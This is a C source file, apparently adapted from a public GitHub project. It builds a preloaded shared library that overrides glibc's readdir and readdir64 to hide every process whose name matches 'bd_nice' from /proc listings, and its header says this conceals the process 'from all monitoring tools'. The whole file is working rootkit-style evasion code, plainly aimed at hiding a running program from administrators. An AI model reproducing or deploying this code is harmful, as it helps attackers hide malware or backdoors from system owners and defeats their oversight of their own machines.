/**
 * @file libprocesshider.c
 * @Gianluca Borello (https://github.com/gianlucaborello)
 * @brief This was taken from a tutorial on github
 *  the binary overrides glibc's readdir
 *  and proceeds to hide our process from all
 *  monitoring tools
 * @version 0.1
 * @date 2018-12-01
 *
 * @copyright Copyright (c) 2018
 *
 */

#define _GNU_SOURCE

#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char *process_to_filter = "bd_nice";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR *dirp, char *buf, size_t size) {
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/**
 * @brief Get a process name given its pid
 * @ Modified: Dimitry Rakhlei 1/Dec/2018
 * @ Changes:  Making it detect based on multiple
 *             files in /proc not just stat
 */
static int get_process_name(char *pid, char *buf) {

    if (strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE *f = fopen(tmp, "r");
    if (f == NULL) {
        return 0;
    }

    if (fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    if (strstr(tmp, process_to_filter) != NULL) {
        return 1;
    }
    return 0;
}

#define DECLARE_READDIR(dirent, readdir)                                       \
    static struct dirent *(*original_##readdir)(DIR *) = NULL;                 \
                                                                               \
    struct dirent *readdir(DIR *dirp) {                                        \
                                                                               \
        if (original_##readdir == NULL) {                                      \
            original_##readdir = dlsym(RTLD_NEXT, "readdir");                  \
            if (original_##readdir == NULL) {                                  \
                fprintf(stderr, "Error in dlsym: %s\n", dlerror());            \
            }                                                                  \
        }                                                                      \
                                                                               \
        struct dirent *dir;                                                    \
                                                                               \
        while (1) {                                                            \
            dir = original_##readdir(dirp);                                    \
            if (dir) {                                                         \
                char dir_name[256];                                            \
                char process_name[256];                                        \
                if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&          \
                    strcmp(dir_name, "/proc") == 0 &&                          \
                    get_process_name(dir->d_name, process_name)) {             \
                    printf("\n\n%s\n\n", process_name);                               \
                    continue;                                                  \
                }                                                              \
            }                                                                  \
            break;                                                             \
        }                                                                      \
        return dir;                                                            \
    }

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
